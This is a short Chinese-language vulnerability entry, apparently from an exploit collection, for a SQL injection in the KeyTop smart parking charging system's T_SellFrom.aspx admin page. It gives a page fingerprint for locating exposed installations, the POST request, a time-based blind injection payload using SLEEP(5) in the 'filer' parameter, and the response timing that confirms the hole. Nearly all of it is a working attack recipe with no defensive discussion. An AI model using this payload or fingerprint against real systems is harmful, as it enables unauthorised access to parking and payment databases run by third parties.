# 科拓全智能停车收费系统T_SellFrom.aspxSQL注入漏洞

科拓全智能停车收费系统T_SellFrom.aspx ｜ SQL注入 ｜ —
- **指纹**：`body="/KT_Css/qd_defaul.css"`
- **请求**：`POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1`

**Payload**
```
start=0&limit=20&filer=1;SELECT SLEEP(5)#
```
- **响应特征**：200 响应时间>=5s